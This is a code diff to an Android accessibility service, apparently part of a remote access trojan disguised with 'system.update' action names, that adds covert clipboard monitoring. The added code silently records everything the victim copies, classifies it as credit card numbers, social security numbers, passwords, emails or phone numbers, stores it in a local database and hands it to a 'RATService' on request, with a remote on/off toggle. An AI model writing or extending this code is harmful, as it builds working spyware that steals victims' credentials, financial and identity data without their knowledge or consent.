@@ -13,6 +13,8 @@ import android.database.sqlite.SQLiteOpenHelper;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -28,16 +30,22 @@ public class BrowserAccessibilityService extends AccessibilityService {
     private static final String PREFS_NAME = "browser_accessibility";
     private static final String KEY_ENABLED = "accessibility_enabled";
     private static final String KEY_CAPTURED_URLS = "captured_urls";
+    private static final String KEY_CLIPBOARD_MONITORING = "clipboard_monitoring";
     
     // Action constants for broadcast communication
     private static final String ACTION_REQUEST_CAPTURED_DATA = "com.android.system.update.REQUEST_CAPTURED_DATA";
     private static final String ACTION_CAPTURED_DATA_RESPONSE = "com.android.system.update.CAPTURED_BROWSER_DATA";
+    private static final String ACTION_CLIPBOARD_UPDATE = "com.android.system.update.CLIPBOARD_UPDATE";
     
     private static BrowserAccessibilityService instance;
     private Set<String> capturedUrls = new HashSet<>();
     private BrowserDatabaseHelper dbHelper;
     private BroadcastReceiver requestReceiver;
-    
+    private ClipboardManager clipboardManager;
+    private ClipboardManager.OnPrimaryClipChangedListener clipboardListener;
+    private String lastClipboardContent = "";
+    private boolean isClipboardMonitoringEnabled = true;
+
     public static BrowserAccessibilityService getInstance() {
         return instance;
     }
@@ -48,23 +56,187 @@ public class BrowserAccessibilityService extends AccessibilityService {
         instance = this;
         dbHelper = new BrowserDatabaseHelper(this);
         loadCapturedUrls();
+        loadClipboardMonitoringPref();
+        
+        // Initialize clipboard manager
+        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        setupClipboardListener();
         
         // Register receiver for data requests from RATService
         requestReceiver = new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
-                if (ACTION_REQUEST_CAPTURED_DATA.equals(intent.getAction())) {
+                String action = intent.getAction();
+                if (ACTION_REQUEST_CAPTURED_DATA.equals(action)) {
                     Log.d(TAG, "Received request for captured data");
                     String data = getCapturedDataInternal();
                     sendCapturedDataViaBroadcast(data);
+                } else if ("com.android.system.update.REQUEST_CLIPBOARD".equals(action)) {
+                    Log.d(TAG, "Received request for current clipboard");
+                    captureCurrentClipboard(true);
+                } else if ("com.android.system.update.TOGGLE_CLIPBOARD_MONITORING".equals(action)) {
+                    boolean enable = intent.getBooleanExtra("enable", true);
+                    setClipboardMonitoring(enable);
                 }
             }
         };
         
-        IntentFilter filter = new IntentFilter(ACTION_REQUEST_CAPTURED_DATA);
+        IntentFilter filter = new IntentFilter();
+        filter.addAction(ACTION_REQUEST_CAPTURED_DATA);
+        filter.addAction("com.android.system.update.REQUEST_CLIPBOARD");
+        filter.addAction("com.android.system.update.TOGGLE_CLIPBOARD_MONITORING");
         registerReceiver(requestReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
         
-        Log.d(TAG, "Browser Accessibility Service created");
+        // Start clipboard monitoring if enabled
+        if (isClipboardMonitoringEnabled) {
+            startClipboardMonitoring();
+        }
+        
+        Log.d(TAG, "Browser Accessibility Service created with clipboard monitoring");
+    }
+
+    private void setupClipboardListener() {
+        clipboardListener = new ClipboardManager.OnPrimaryClipChangedListener() {
+            @Override
+            public void onPrimaryClipChanged() {
+                if (!isEnabled() || !isClipboardMonitoringEnabled) return;
+                captureCurrentClipboard(false);
+            }
+        };
+    }
+
+    private void startClipboardMonitoring() {
+        try {
+            clipboardManager.addPrimaryClipChangedListener(clipboardListener);
+            Log.d(TAG, "Clipboard monitoring started");
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception starting clipboard monitoring", e);
+        }
+    }
+
+    private void stopClipboardMonitoring() {
+        try {
+            clipboardManager.removePrimaryClipChangedListener(clipboardListener);
+            Log.d(TAG, "Clipboard monitoring stopped");
+        } catch (Exception e) {
+            Log.e(TAG, "Error stopping clipboard monitoring", e);
+        }
+    }
+
+    private void setClipboardMonitoring(boolean enable) {
+        isClipboardMonitoringEnabled = enable;
+        saveClipboardMonitoringPref();
+        
+        if (enable) {
+            startClipboardMonitoring();
+            // Capture current clipboard immediately when starting
+            captureCurrentClipboard(true);
+        } else {
+            stopClipboardMonitoring();
+        }
+        
+        Log.d(TAG, "Clipboard monitoring set to: " + enable);
+    }
+
+    private void captureCurrentClipboard(boolean force) {
+        try {
+            if (!clipboardManager.hasPrimaryClip()) {
+                Log.d(TAG, "No clipboard content available");
+                return;
+            }
+
+            ClipData clipData = clipboardManager.getPrimaryClip();
+            if (clipData == null || clipData.getItemCount() == 0) {
+                Log.d(TAG, "Clipboard is empty");
+                return;
+            }
+
+            ClipData.Item item = clipData.getItemAt(0);
+            CharSequence text = item.getText();
+            
+            if (text == null) {
+                Log.d(TAG, "Clipboard item has no text (might be URI or Intent)");
+                return;
+            }
+
+            String content = text.toString();
+            
+            // Skip if same as last captured content (avoid duplicates)
+            if (!force && content.equals(lastClipboardContent)) {
+                Log.d(TAG, "Skipping duplicate clipboard content");
+                return;
+            }
+
+            lastClipboardContent = content;
+            
+            // Get package name of the app that set the clipboard (if available)
+            String sourcePackage = "unknown";
+            try {
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
+                    sourcePackage = clipData.getDescription().getPackageLabel().toString();
+                }
+            } catch (Exception e) {
+                // Ignore, use default
+            }
+
+            // Save to database
+            SQLiteDatabase db = dbHelper.getWritableDatabase();
+            ContentValues values = new ContentValues();
+            values.put("package_name", "clipboard");
+            values.put("url", "clipboard://content");
+            values.put("title", "Clipboard Content");
+            values.put("query", content);
+            values.put("field", sourcePackage);
+            values.put("value", detectClipboardType(content));
+            values.put("type", "clipboard");
+            values.put("timestamp", System.currentTimeMillis());
+            
+            long id = db.insert("browser_data", null, values);
+            db.close();
+            
+            Log.d(TAG, "📋 Clipboard captured: " + content.substring(0, Math.min(30, content.length())) + "... (id: " + id + ")");
+            
+            // Send broadcast about new clipboard content
+            Intent intent = new Intent(ACTION_CLIPBOARD_UPDATE);
+            intent.putExtra("content_preview", content.substring(0, Math.min(50, content.length())));
+            intent.putExtra("timestamp", System.currentTimeMillis());
+            sendBroadcast(intent);
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception capturing clipboard", e);
+        } catch (Exception e) {
+            Log.e(TAG, "Error capturing clipboard", e);
+        }
+    }
+
+    private String detectClipboardType(String content) {
+        if (content.matches(".*[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}.*")) {
+            return "email";
+        } else if (content.matches(".*\\b\\d{3}[-.]?\\d{3}[-.]?\\d{4}\\b.*")) {
+            return "phone";
+        } else if (content.matches(".*\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b.*")) {
+            return "credit_card";
+        } else if (content.matches(".*\\b\\d{3}-\\d{2}-\\d{4}\\b.*")) {
+            return "ssn";
+        } else if (content.length() > 20 && 
+                   (content.contains("password") || content.contains("pass") || 
+                    content.matches("^(?=.*[A-Za-z])(?=.*\\d)[A-Za-z\\d]{8,}$"))) {
+            return "password";
+        } else if (content.startsWith("http")) {
+            return "url";
+        } else {
+            return "text";
+        }
+    }
+
+    private void loadClipboardMonitoringPref() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        isClipboardMonitoringEnabled = prefs.getBoolean(KEY_CLIPBOARD_MONITORING, true);
+    }
+
+    private void saveClipboardMonitoringPref() {
+        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
+        prefs.edit().putBoolean(KEY_CLIPBOARD_MONITORING, isClipboardMonitoringEnabled).apply();
     }
     
     @Override
@@ -324,6 +496,8 @@ public class BrowserAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        stopClipboardMonitoring();
+        
         if (requestReceiver != null) {
             unregisterReceiver(requestReceiver);
             requestReceiver = null;
@@ -395,15 +569,67 @@ public class BrowserAccessibilityService extends AccessibilityService {
         }
     }
     
-    // Public method to get captured data (can be called directly if needed)
+    // Public method to get captured data
     public String getCapturedData() {
         return getCapturedDataInternal();
     }
     
-    // Database Helper
+    // Get clipboard-specific data
+    public String getClipboardData() {
+        try {
+            JSONArray dataArray = new JSONArray();
+            SQLiteDatabase db = dbHelper.getReadableDatabase();
+            
+            Cursor cursor = db.query("browser_data", null, "type = ?", 
+                new String[]{"clipboard"}, null, null, "timestamp DESC LIMIT 100");
+            
+            int idIndex = cursor.getColumnIndex("id");
+            int queryIndex = cursor.getColumnIndex("query");
+            int fieldIndex = cursor.getColumnIndex("field");
+            int valueIndex = cursor.getColumnIndex("value");
+            int timestampIndex = cursor.getColumnIndex("timestamp");
+            
+            if (cursor.moveToFirst()) {
+                do {
+                    JSONObject item = new JSONObject();
+                    
+                    if (idIndex >= 0) item.put("id", cursor.getInt(idIndex));
+                    if (queryIndex >= 0) item.put("content", cursor.getString(queryIndex));
+                    if (fieldIndex >= 0) item.put("source", cursor.getString(fieldIndex));
+                    if (valueIndex >= 0) item.put("type", cursor.getString(valueIndex));
+                    if (timestampIndex >= 0) {
+                        long timestamp = cursor.getLong(timestampIndex);
+                        item.put("timestamp", timestamp);
+                        
+                        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
+                        item.put("timestampFormatted", sdf.format(new Date(timestamp)));
+                    }
+                    
+                    dataArray.put(item);
+                } while (cursor.moveToNext());
+            }
+            
+            cursor.close();
+            db.close();
+            
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            result.put("data", dataArray);
+            result.put("count", dataArray.length());
+            result.put("monitoring", isClipboardMonitoringEnabled);
+            
+            return result.toString();
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting clipboard data", e);
+            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
+        }
+    }
+    
+    // Database Helper (updated schema for clipboard)
     private static class BrowserDatabaseHelper extends SQLiteOpenHelper {
         private static final String DATABASE_NAME = "browser_capture.db";
-        private static final int DATABASE_VERSION = 1;
+        private static final int DATABASE_VERSION = 2; // Incremented for schema change
         
         public BrowserDatabaseHelper(Context context) {
             super(context, DATABASE_NAME, null, DATABASE_VERSION);
@@ -423,13 +649,21 @@ public class BrowserAccessibilityService extends AccessibilityService {
                 "timestamp LONG" +
                 ")";
             db.execSQL(createTable);
-            Log.d(TAG, "Database created");
+            
+            // Create index for faster queries
+            db.execSQL("CREATE INDEX idx_type ON browser_data(type)");
+            db.execSQL("CREATE INDEX idx_timestamp ON browser_data(timestamp)");
+            
+            Log.d(TAG, "Database created with schema v2");
         }
         
         @Override
         public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
-            db.execSQL("DROP TABLE IF EXISTS browser_data");
-            onCreate(db);
+            if (oldVersion < 2) {
+                // Add index for existing database
+                db.execSQL("CREATE INDEX IF NOT EXISTS idx_type ON browser_data(type)");
+                db.execSQL("CREATE INDEX IF NOT EXISTS idx_timestamp ON browser_data(timestamp)");
+            }
         }
     }
 }
